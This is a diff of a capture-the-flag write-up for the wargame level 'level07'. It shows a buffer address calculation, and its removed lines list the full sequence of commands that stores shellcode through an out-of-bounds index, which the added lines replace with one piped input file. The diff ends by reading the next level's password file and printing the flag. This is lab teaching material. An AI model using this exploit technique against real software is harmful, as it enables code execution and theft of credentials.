@@ -56,6 +56,7 @@ printf %d 0xffffd504
 4294956292
 ```
 Because gdb adds runtime environment variables, the address of our buffer is innacurate, adding some '\90' instruction padding and increasing our address by 32 bytes is enough to reach it.		
+`4294956292 + 32 = 4294956324`		
 
 Our shellcode:		
 ```bash
@@ -69,71 +70,12 @@ All that is left is placing our shellcode inside the buffer:
 - convert to decimal		
 - store them starting from index 0 (using the overflow exploit)		
 
-```bash
-printf %d 0xffffd536 ; address of buffer +32
-4294956342
+To save time debugging we can list in a file all the commands to be passed to the program. (see [ressource](https://github.com/PapaGateau/override/tree/master/level07/Ressources/inj07)).		
 
-./level07
-Input command: store
- Number: 4294956292
- Index: 1073741938
- Completed store command successfully
-Input command: read
- Index: 114
- Number at data[114] is 4294956292
- Completed read command successfully
-Input command: store
- Number: 2425393296
- Index: 1073741824
- Completed store command successfully
-Input command: store
- Number: 2425393296
- Index: 1
- Completed store  command successfully
-Input command: store
- Number: 2425393296
- Index: 2
- Completed store command successfully
-Input command: store
- Number: 2425393296
- Index: 1073741827
- Completed store command successfully
-Input command: store
- Number: 2572684138
- Index: 4
- Completed store command successfully
-Input command: store
- Number: 791636050
- Index: 5
- Completed store command successfully
-Input command: store
- Number: 795371635
- Index: 1073741830
- Completed store command successfully
-Input command: store
- Number: 2305714530
- Index: 7
- Completed store command successfully
-Input command: store
- Number: 3452514787
- Index: 8
- Completed store command successfully
-Input command: store
- Number: 128
- Index: 1073741833
- Completed store command successfully
-Input command: read
- Index: 114
- Number at data[114] is 4294956292
- Completed read  command successfully
-Input command: store
- Number: 4294956342
- Index: 1073741938
- Completed store command successfully
-Input command: read
- Index: 114
- Number at data[114] is 4294956342
- Completed read command successfully
+```bash
+
+cat /tmp/inj07 - | ./level07
+
 Input command: quit
 $ cat /home/users/level08/.pass
 7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
